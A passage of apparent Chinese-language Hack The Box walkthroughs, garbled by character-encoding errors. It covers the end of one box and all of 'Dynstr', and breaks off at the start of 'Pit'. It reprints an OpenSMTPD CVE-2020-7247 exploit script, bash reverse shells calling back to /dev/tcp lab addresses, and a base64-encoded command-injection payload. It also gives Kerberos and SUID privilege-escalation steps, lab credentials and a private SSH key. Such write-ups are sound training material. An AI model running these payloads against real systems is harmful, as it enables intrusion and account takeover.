IN A 10.197.243.77 wpad.realcorp.htb. 259200 IN A 10.197.243.31 æˆ‘ä»¬å¾—åˆ°äº†å‡ ä¸ªåŸŸï¼Œä½†æ˜¯æ— æ³•ç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨proxychains4æ¥æšä¸¾å®ƒ å…ˆè®©æˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹ä»£ç†é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;proxychains.conf echo â€œ[ProxyList]\\nhttp 10.10.10.224 3128\\nhttp 127.0.0.1 3128\\nhttp 10.197.243.77 3128â€ &gt; &#x2F;etc&#x2F;proxychains.conf è®¾ç½®å¥½ä»¥åï¼Œä½¿ç”¨nmapè¿›è¡Œæ‰«æ proxychains -f &#x2F;etc&#x2F;proxychains.conf nmap -sT -Pn 10.197.243.31 ç»è¿‡éå¸¸æ¼«é•¿çš„ç­‰å¾…ä»¥åï¼Œå’±ä»¬å‘ç°å¼€å¯äº†è¿™å‡ ä¸ªç«¯å£ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ª80ç«¯å£å¼€ç€ï¼Œå’±ä»¬é€šè¿‡ä»£ç†å»è®¿é—®çœ‹çœ‹ proxychains firefox wpad.realcorp.htb æ— æ³•è¢«è®¿é—® å’±ä»¬æ·»åŠ ä¸€ä¸ªæœ¬åœ°è§£æ echo 10.197.243.31 wpad.realcorp.htb &gt; &#x2F;etc&#x2F;hosts å†æ¬¡è®¿é—®å°±æç¤º403äº†ï¼Œå’±ä»¬åšä¸€ä¸ªä¿¡æ¯æœé›†çœ‹çœ‹ proxychains dirb http://wpad.realcorp.htb/ ç»è¿‡æ¼«é•¿çš„ç­‰å¾…åï¼Œå¹¶æ²¡æœ‰è·å¾—ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ ç„¶åæˆ‘æŠŠç€çœ¼ç‚¹æ”¾åˆ°äº†å­åŸŸåä¸Š wpadï¼Œæˆ‘å»googleäº†ä¸€ä¸‹ å‘ç°æœ‰ä¸€ä¸ªwpad.datçš„æ–‡ä»¶ï¼Œå’±ä»¬å»è¯•è¯•èƒ½ä¸èƒ½ä¸‹è½½ä¸‹æ¥ proxychains firefox http://wpad.realcorp.htb/wpad.dat OK å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ä¸‹è½½ WPADåè®®åˆ†æåŠå†…ç½‘æ¸—é€åˆ©ç”¨ https://xz.aliyun.com/t/1739#toc-9 åœ¨æˆ‘è‡ªå·±æµ‹è¯•çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªæ®µ10.197.243.0&#x2F;24è¿™ä¸ªIPæ®µï¼Œå’±ä»¬å¯ä»¥è·³è¿‡ åœ¨æ‰«æç¬¬äºŒä¸ªIPæ®µ10.241.251.0&#x2F;24çš„æ—¶å€™ï¼Œç»è¿‡äº†å¤§é‡çš„ä¿¡æ¯æœé›†ï¼Œå‘ç°10.241.251.113å¼€å¯äº†smtpç«¯å£ï¼Œå› ä¸ºæˆ‘å·²ç»åšè¿‡ä¸€æ¬¡äº†ï¼Œå°±ä¸åšé‡å¤ç”¨å·¥ï¼Œç›´æ¥æ‰«æ113è¿™å°æœºå™¨ proxychains -f &#x2F;etc&#x2F;proxychains.conf nmap -sT -sV -Pn 10.241.251.113 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ113è¿™å°æœºå™¨å¼€å¯äº†25ç«¯å£ï¼Œä¹Ÿå°±æ˜¯smtpæœåŠ¡ æ¼æ´åˆ©ç”¨ å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨çš„æ˜¯OpenSMTPDï¼Œå’±ä»¬å»æœç´¢ä¸€ä¸‹ç›¸å…³çš„æ¼æ´ å’±ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªCVE-2020-7247 https://www.exploit-db.com/exploits/47984 å’±ä»¬ç®€å•ä¿®æ”¹ä¸€ä¸‹Exploit #!&#x2F;usr&#x2F;bin&#x2F;env python3 import socket, time import sys if len(sys.argv) &lt; 4: print(â€œusage: exploit.py â€œ) exit() HOST &#x3D; sys.argv[1] PORT &#x3D; int(sys.argv[2]) rev_shell_cmd &#x3D; sys.argv[3] payload &#x3D; bâ€â€â€\\r\\n #0\\r\\n #1\\r\\n #2\\r\\n #3\\r\\n #4\\r\\n #5\\r\\n #6\\r\\n #7\\r\\n #8\\r\\n #9\\r\\n #a\\r\\n #b\\r\\n #c\\r\\n #d\\r\\n â€œâ€â€ + rev_shell_cmd.encode() + bâ€â€â€ . â€œâ€â€ for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM): af, socktype, proto, canonname, sa &#x3D; res try: s &#x3D; socket.socket(af, socktype, proto) except OSError as msg: s &#x3D; None continue try: s.connect(sa) except OSError as msg: s.close() s &#x3D; None continue break if s is None: print(â€œCould not open socketâ€) sys.exit(1) with s: data &#x3D; s.recv(1024) print(â€˜Receivedâ€™, repr(data)) time.sleep(1) print(â€˜SENDING HELOâ€™) s.send(bâ€helo test.com\\r\\nâ€) data &#x3D; s.recv(1024) print(â€˜RECIEVEDâ€™, repr(data)) s.send(bâ€MAIL FROM:&lt;;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;&gt;\\r\\nâ€) time.sleep(1) data &#x3D; s.recv(1024) print(â€˜RECIEVEDâ€™, repr(data)) s.send(bâ€RCPT TO:j.nakazawa@realcorp.htb\\r\\nâ€) data &#x3D; s.recv(1024) print(â€˜RECIEVEDâ€™, repr(data)) s.send(bâ€DATA\\r\\nâ€) data &#x3D; s.recv(1024) print(â€˜RECIEVEDâ€™, repr(data)) s.send(payload) data &#x3D; s.recv(1024) print(â€˜RECIEVEDâ€™, repr(data)) s.send(bâ€QUIT\\r\\nâ€) data &#x3D; s.recv(1024) print(â€˜RECIEVEDâ€™, repr(data)) print(â€œExploitedâ€) s.close() ä¿å­˜ä¸ºexploit.pyåï¼Œæœ¬åœ°ä½¿ç”¨ncå¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬ nc -nvlp 4444 ä½¿ç”¨proxychains4ä»£ç†è¿è¡Œè¯¥è„šæœ¬ proxychains4 python3 expliot.py 10.241.251.113 25 â€˜bash -c â€œexec bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.2&#x2F;4444 &lt;&amp;1â€â€˜ æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshellï¼Œå¹¶ä¸”ç›´æ¥å°±æ˜¯rootæƒé™ ä½†æ˜¯è¿™ä¸ªshellæ˜¯smtpçš„rootï¼Œå¹¶ä¸æ˜¯ç³»ç»Ÿçš„rootï¼Œå’±ä»¬è¿˜è¦æƒ³åŠæ³•ææƒ æƒé™æå‡ å’±ä»¬è¿›å…¥&#x2F;homeç›®å½•æŸ¥çœ‹ä¸€ä¸‹ æœ‰ä¸€ä¸ªj.nakazawaç›®å½•ï¼Œå’±ä»¬è¿›å»æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ç”¨çš„ä¸œè¥¿ æˆ‘ä»¬åœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ª.msmtprcæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ å’±ä»¬å¾—åˆ°äº†ç”¨æˆ·j.nakazawaçš„è´¦å·å¯†ç  USERNAME &#x3D; j.nakazawa PASSWORD &#x3D; sJB}RM&gt;6Z~64_ ä½†è¿™ä¸ªç”¨æˆ·æ— æ³•ç›´æ¥ç™»å½•sshï¼Œæ‰€ä»¥å’±ä»¬è¿˜å¾—æƒ³åŠæ³•æ¥åˆ©ç”¨ å„ä½è¿˜è®°å¾—10.10.10.224è¿™å°æœºå™¨ä¸Š 3128ç«¯å£ä¸­å¦ä¸€ä¸ªçº¿ç´¢å— æ²¡é”™ï¼Œå°±æ˜¯è¿™ä¸ªsrv01.realcorp.htbï¼Œå’±ä»¬å°†å®ƒåŠ å…¥åˆ°hostsé‡Œ echo 10.10.10.224 srv01.realcorp.htb &gt; &#x2F;etc&#x2F;hosts è®°å¾—ç¡®ä¿hostsæ–‡ä»¶ä¸­åªæœ‰è¿™ä¸€å°ä¸»æœºï¼Œè¾“å…¥ä¸Šé¢çš„æŒ‡ä»¤å³å¯ ç„¶åæˆ‘ä»¬ä½¿ç”¨kerbosç”Ÿæˆç¥¨æ®è¿›è¡Œç™»å½• apt install krb5-user ç„¶åå’±ä»¬ä¿®æ”¹å¯¹åº”é…ç½® vim &#x2F;etc&#x2F;krb5.conf [libdefaults] default_realm &#x3D; REALCORP.HTB [realms] REALCORP.HTB &#x3D; { kdc &#x3D; 10.10.10.224 } [domain_realm] srv01.realcorp.htb &#x3D; REALCORP.HTB åˆ†åˆ«å¡«å…¥å¯¹åº”ä½ç½®å³å¯ ç„¶åå’±ä»¬å»ç”Ÿæˆç¥¨æ® kinit j.nakazawa passwordï¼šsJB}RM&gt;6Z~64_ ç„¶åå’±ä»¬æ£€æŸ¥ä¸€ä¸‹å¯ç”¨çš„ç¥¨æ® klist OKï¼Œç¡®å®šç”ŸæˆæˆåŠŸ ç„¶åå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½• ssh j.nakazawa@10.10.10.224 ç™»å½•æˆåŠŸ æˆåŠŸè·å¾—useræƒé™çš„flag å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹&#x2F;etc&#x2F;crontab å®šæ—¶ä»»åŠ¡å‘ç°adminå®šæ—¶è¿è¡Œ&#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ä»squidç›®å½•å¤åˆ¶æ–‡ä»¶åˆ°adminç›®å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœå†™å…¥è®¤è¯æ–‡ä»¶åˆ°squidç›®å½•ï¼Œä»è€Œä½¿å…¶è¢«å¤åˆ¶åˆ°adminç›®å½•å‘¢ï¼Ÿè¯´å¹²å°±å¹² ç°åœ¨åˆ›å»ºä¸€ä¸ªåä¸º.k5loginçš„æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶åˆ°squidç›®å½•ä¸‹ echo â€œ&#x6a;&#46;&#x6e;&#97;&#107;&#x61;&#x7a;&#x61;&#119;&#x61;&#x40;&#x52;&#x45;&#65;&#x4c;&#x43;&#79;&#x52;&#80;&#x2e;&#x48;&#x54;&#x42;â€œ &gt;&gt; .k5login cp .k5login &#x2F;var&#x2F;log&#x2F;squid ç„¶åæˆ‘ä»¬ç¨ç­‰ä¸€ä¼šå„¿ä¹‹åï¼Œä½¿ç”¨adminçš„èº«ä»½æ¥è¿›è¡Œç™»å½• OKï¼ŒæˆåŠŸæ‹¿åˆ°adminæƒé™ ä½†æ˜¯æˆ‘å‘ç°ï¼Œæƒé™è¿˜æ˜¯ä¸å¤Ÿï¼Œå’±ä»¬è¿˜ä¸æ˜¯rootæƒé™ï¼Œè¿˜å¾—æã€‚ã€‚ã€‚ å¥½å®¶ä¼™ï¼Œè¿™å¾—æä¸‰æ¬¡æƒä¹Ÿæ˜¯æ²¡è°äº† å’±ä»¬ä½¿ç”¨klistæŸ¥çœ‹ä¸€ä¸‹&#x2F;etc&#x2F;krb5.keytabè¿™ä¸ªæ–‡ä»¶ klist -k &#x2F;etc&#x2F;krb5.keytab å’±ä»¬å‘ç°äº†æœ‰å¾ˆå¤šä¸ªKerberosçš„åŠ å¯†å¯†é’¥ å’±ä»¬ä½¿ç”¨kadminè¿›è¡Œåˆ©ç”¨ kadmin -k -t &#x2F;etc&#x2F;krb5.keytab -p kadmin&#x2F;admin@REALCORP.HTB add_principal root@REALCORP.HTB ç„¶åè‡ªå·±è®¾ç½®ä¸€ä¸ªå¯†ç å³å¯ ç„¶åä½¿ç”¨ksuåˆ‡æ¢åˆ°rootå³å¯ æˆåŠŸææƒåˆ°root æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æ”¶å·¥ç¡è§‰ å“ï¼Œç›®å‰åœ¨çº¿çš„easyå’Œmediuméƒ½æ‰“å®Œäº†ï¼Œä»Šå¤©å¼€å§‹åªèƒ½æ‰“hardéš¾åº¦çš„äº†ï¼Œéš¾é¡¶å•Š","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Dynstr - Hackthebox","slug":"Hackthebox - Dynstr","date":"2021-06-15T11:38:36.000Z","updated":"2023-05-20T01:41:03.000Z","comments":true,"path":"2021/06/15/Hackthebox - Dynstr/","link":"","permalink":"http://www.lucifiel.com/2021/06/15/Hackthebox%20-%20Dynstr/","excerpt":"","text":"Hackthebox - Dynstré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†22 53 80ä¸‰ä¸ªç«¯å£ï¼Œè®©æˆ‘ä»¬è®¿é—®80ç«¯å£çœ‹çœ‹ è®¿é—®åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸‰ä¸ªåŸŸåï¼Œè€è§„çŸ©ï¼Œæ·»åŠ è¿›hosts echo &quot;10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb&quot; &gt;&gt; /etc/hosts æˆ‘è®¿é—®äº†ä¸€ä¸‹è¿™å‡ ä¸ªåŸŸåï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œé‚£å’±ä»¬åšä¸ªä¿¡æ¯æœé›†å§ å°±æ‹¿æœ€çŸ­çš„dyna.htbå…¥æ‰‹å§ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &quot;http://dyna.htb&quot; -H &quot;HOST: FUZZ.dyna.htb&quot; å’±ä»¬éœ€è¦è¿‡æ»¤æ‰10909ä¸ªå­—ç¬¦ åŠ ä¸Šâ€“hh 10909 å•Šè¿™ï¼Œç»“æœå•¥éƒ½æ²¡æ‰¾åˆ°ï¼Œé‚£åªèƒ½å»çœ‹çœ‹æœ‰æ²¡æœ‰å•¥å…¬å¼€æ¼æ´äº†å‘€ ISC BIND 9.16.1æœç´¢è¿™ä¸ªçš„æ¼æ´ æ‰¾åˆ°ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºï¼Œä½†æ˜¯å´æ²¡æœ‰åˆ©ç”¨çš„exploitï¼Œè¿™å°±å¾ˆéš¾å—äº†å‘€ã€‚æ²¡åŠæ³•ï¼Œç»§ç»­è¿”å›åšä¿¡æ¯æœé›†å§ å’±ä»¬çˆ†ç ´ä¸€ä¸‹ç›®å½•å§ gobuster dir -u &quot;http://dyna.htb&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt å‘ç°ä¸¤ä¸ªç›®å½• &#x2F;assetsè¿™ä¸ªç›®å½•æ— æ³•è®¿é—® &#x2F;nicè¿™ä¸ªç›®å½•æ˜¾ç¤ºç©ºç™½ å’±ä»¬éœ€è¦è¿›ä¸€æ­¥fuzz å¾—åˆ°ä¸€ä¸ªbadauthï¼Œå†åŠ ä¸Šåœ¨ä¸»é¡µæ‰¾åˆ°çš„å‡­è¯ Username: dynadns Password: sndanyd å’±ä»¬ä½¿ç”¨curlçš„-uåŠŸèƒ½è¿›è¡Œè®¿é—® curl -u dynadns:sndanyd http://dyna.htb/nic/update å¾—åˆ°äº†ä¸€ä¸ªçº¿ç´¢ï¼Œnochgï¼Œå’±ä»¬å»Googleä¸€ä¸‹è¿™æ˜¯å•¥ä¸œè¥¿ https://www.noip.com/integrate/response https://help.dyn.com/remote-access-api/return-codes/ è¿™å¯¼è‡´no-ip dynamic dnsçœ‹åˆ°ç›¸åº”ä»£ç  æˆ‘ä»¬å¯ä»¥çœ‹åˆ°nochgå‘Šè¯‰æˆ‘ä»¬è¿˜æ²¡æœ‰æä¾›è¦æ›´æ–°çš„ä¸»æœºåï¼Œæ‰€ä»¥è®©æˆ‘ä»¬æ·±å…¥äº†è§£å¦‚ä½•æ›´æ–°dnsè®°å½• https://www.noip.com/integrate/request æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´æ–°dnsè®°å½•ï¼Œä½†æ˜¯å®ƒéœ€è¦æœ‰æ•ˆ å’±ä»¬å…ˆä½¿ç”¨burpæ‹¦æˆªä¸€ä¸ªè¯·æ±‚ æ¼æ´åˆ©ç”¨è®¿é—®http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197 ç„¶ååœ¨è¯·æ±‚æš´åŠ›æ·»åŠ ä¸€ä¸ªæ ‡å¤´Authorization: Basic ZHluYWRuczpzbmRhbnlk è¿™ä¸ªæ ‡å¤´çš„base64é‡ŒåŒ…å«äº†è´¦å·å¯†ç  ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´æŠ¥é”™ ç»è¿‡å¤šæ¬¡å°è¯•åï¼Œè¦éšä¾¿åŠ ä¸€ä¸ªå¹¶ä¸å­˜åœ¨çš„å­åŸŸå æˆäº† å°è¯•äº†ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œï¼Œæç¤ºæŠ¥é”™ï¼Œä½†å¯ä»¥ç¡®å®šæ˜¯å­˜åœ¨è¯¥æ¼æ´çš„ https://github.com/LucifielHack/command-injection-payload-list è¿™æ˜¯å‘½ä»¤æ‰§è¡Œçš„è¡¨ï¼Œå¤§ä¼™å„¿å¯ä»¥è‡ªä¸ªå„¿å»fuzzä¸€ä¸‹ $(echo+id+|bash)â€è¿™æ˜¯æˆ‘æµ‹è¯•å‡ºæ¥çš„å‘½ä»¤æ‰§è¡Œæ ¼å¼ ç°åœ¨å’±ä»¬è¦åå¼¹ä¸€ä¸ªshellå›å» é¦–å…ˆæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 999 ç„¶åæ„é€ åå¼¹çš„å‘½ä»¤ /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.197/999 0&gt;&amp;1&#39; ç”±äºç›´æ¥æ”¾åˆ°burpé‡Œå»æ‰§è¡Œå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥å’±ä»¬å…ˆç»™ä»–è½¬ä¸ºbase64 L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc&#x3D;ç„¶åä½¿ç”¨ç®¡é“åŠŸèƒ½è¿›è¡Œè§£ç ï¼Œç„¶åå†é€šè¿‡ç®¡é“ä¼ å›bash /nic/update?hostname=\\$(echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=+|+base64+-d+|+bash)&quot;arz.no-ip.htb&amp;myip=10.10.14.197 æˆåŠŸå¼¹å›shell ä½¿ç”¨python3è·å¾—ä¸€ä¸ªè¾ƒä¸ºç¨³å®šçš„shell å’±ä»¬æŸ¥çœ‹äº†ä¸€ä¸‹passwdæ–‡ä»¶ï¼Œå‘ç°äº†æœ‰ä¸€ä¸ªbindmgrç”¨æˆ·ï¼ŒåŒæ—¶åœ¨&#x2F;homeç›®å½•ä¸‹ä¹Ÿæœ‰ä»–çš„æ–‡ä»¶å¤¹ å’±ä»¬è¿›å»æŸ¥çœ‹ä¸€ä¸‹ å’±ä»¬ä¼¼ä¹å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹C62796521-debugging.script æŸ¥çœ‹çš„åŒæ—¶ä¼šå‘ç°å†…å®¹æœ‰ç‚¹å¤šï¼Œå®¹æ˜“é€ æˆä¹±ç ã€‚å¤§å®¶çœ‹ä»”ç»†ç‚¹ï¼Œåæ­£æˆ‘æ˜¯çœ‹çš„è„‘ç“œå­ç–¼ å¤åˆ¶å‡ºæ¥åï¼Œç»è¿‡å¤„ç†ä¿å­˜åˆ°æœ¬åœ°ï¼ŒæˆåŠŸè·å¾—äº†ä¸€ä¸ªsshçš„å¯†é’¥ï¼Œå’±ä»¬å»ç™»å½•è¯•è¯• ä½†æ˜¯è¿™è¿˜æ˜¯éœ€è¦å¯†ç ï¼Œè¿™æŒ‡å®šæ˜¯ä¸å¯¹å•Šï¼Œå’±ä»¬å†å»çœ‹çœ‹ å’±ä»¬æŸ¥çœ‹äº†ä¸€ä¸‹updateçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°nsupdateä¸å¯†é’¥ä¸€èµ·ä½¿ç”¨&#x2F;etc&#x2F;bind&#x2F;ddns.key æ‰€ä»¥è¿™é‡Œè¦ä½¿ç”¨ä¸åŒçš„å¯†é’¥ï¼Œå’±ä»¬è¿›å…¥&#x2F;etc&#x2F;bind å’±ä»¬éœ€è¦è®²infra.keyæ·»åŠ åˆ°DNSè®°å½• nsupdate -v -k /etc/bind/infra.key update add arz.infra.dyna.htb 86400 a 10.10.14.197 send show è¿™æ—¶å€™å¦‚æœæˆ‘ä»¬è¿è¡Œnslookupï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªå›å¤ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªè®°å½•å·²ç»è¢«æ·»åŠ è¿›å»äº† ä½†æ˜¯æˆ‘ä»¬ä»ç„¶æ— æ³•é€šè¿‡ ssh ç™»å½•ï¼Œå› ä¸º dns çš„ä½¿ç”¨å·²å¯ç”¨ï¼Œå› ä¸º ssh ä¼šè¿›è¡Œåå‘ dns æŸ¥æ‰¾è¿‡ç¨‹ï¼Œå› æ­¤åŸŸåæ­£åœ¨è§£æä¸º IPï¼Œä½† IP åœ°å€ä¸ä¼šè§£æä¸ºåŸŸåï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ·»åŠ PTRè®°å½•ä¸ºæ­¤ç›®çš„ å’±ä»¬å»æ·»åŠ ä¸€ä¸ªAè®°å½• nsupdate -k /etc/bind/infra.key update add anything.infra.dyna.htb 86400 A 10.10.14.197 æ­¤è¡Œä¸ºç©ºæ ¼ ä¸‹ä¸€è¡Œçš„IPä¸ºD.C.B.Aæ ¼å¼ï¼Œä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬çš„IPåè¿‡æ¥ update add 197.14.10.10.in-addr.arpa. 300 PTR anything.infra.dyna.htb send è¾“å…¥ echo &quot;-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n&quot; &gt; id\\_rsa å³å¯è·å¾—æˆ‘ä»¬çš„å¯†é’¥ï¼Œé€šè¿‡ä¸Šé¢çš„æ–¹å¼å’±ä»¬è‡ªå·±è·å¾—ä¹Ÿå¯ä»¥ è¿™é‡Œæ·»åŠ Aè®°å½•ä»¥åï¼Œå’±ä»¬å»å°è¯•sshç™»å½• æˆåŠŸæ‹¿åˆ°bindmgrè´¦æˆ·æƒé™ æˆåŠŸè·å¾—useræƒé™flag æƒé™æå‡ å’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™ å‘ç°å¯ä»¥æ‰§è¡Œbindmgr.shæ–‡ä»¶ï¼Œå’±ä»¬å…ˆå»çœ‹ä¸€ä¸‹ è¿™é‡Œå’±ä»¬æ£€æŸ¥ä¸€ä¸‹.versionæ–‡ä»¶å…µä½¿ç”¨é€šé…ç¬¦*å¤åˆ¶æ‰€æœ‰å†…å®¹ find / -name &quot;.version&quot; 2&gt;/dev/null æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ.versionåœ¨&#x2F;etc&#x2F;æ–‡ä»¶å¤¹ä¸­ï¼Œæ‰€æœ‰è¿™ä¸ªæ–‡ä»¶ä¼šåœ¨å“ªé‡Œè¿è¡Œ è¿™é‡Œæˆ‘ä»¬è¦åšçš„äº‹åˆ›å»º.versionæ–‡ä»¶å¹¶æ·»åŠ 42åˆ°å®ƒé‡Œé¢ echo 42 &gt; .version é¦–å…ˆæˆ‘ä»¬å¤åˆ¶&#x2F;bin&#x2F;bashåˆ°å½“å‰ç›®å½•å¹¶ä½¿å…¶æˆä¸ºSUIDäºŒè¿›åˆ¶æ–‡ä»¶ cp /bin/bash . chmod +s bash ls -la ä¸‹é¢å›¾ç‰‡é”™äº†ï¼Œè¯·è§è°… æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸ºâ€“preserve&#x3D;modeçš„æ–‡ä»¶æ¥åˆ©ç”¨å®ƒï¼ŒåŒæ—¶å¤åˆ¶å®ƒä¼šä¿ç•™è¿™ä¸ªç›®å½•ä¸­æ–‡ä»¶çš„å±æ€§ï¼Œå°±åƒbashæœ‰SUIDæ‰€ä»¥å®ƒä¼šä¿ç•™é‚£äº›å±æ€§å¹¶å°†å…¶å¤åˆ¶åˆ°&#x2F;etc&#x2F;bind&#x2F;named.bindmgrä¸ºrootæƒé™ echo &gt; --preserve=mode ls -la ç°åœ¨åªéœ€è¦è¿è¡Œsudoè„šæœ¬ sudo /usr/local/bin/bindmgr.sh æ‰§è¡Œ.&#x2F;bash -på³å¯ææƒ cd /etc/bind/named.bindmgr ./bash -p æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Pit - Hackthebox","slug":"Hackthebox - Pit","date":"2021-06-11T11:38:36.000Z","updated":"2023-05-20T02:44:09.000Z","comments":true,"path":"2021/06/11/Hackthebox - Pit/","link":"","permalink":"http://www.lucifiel.com/2021/06/11/Hackthebox%20-%20Pit/","excerpt":"","text":"Hackthebox - PitHackthebox - Pit é¶åœºå®æˆ˜ é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† 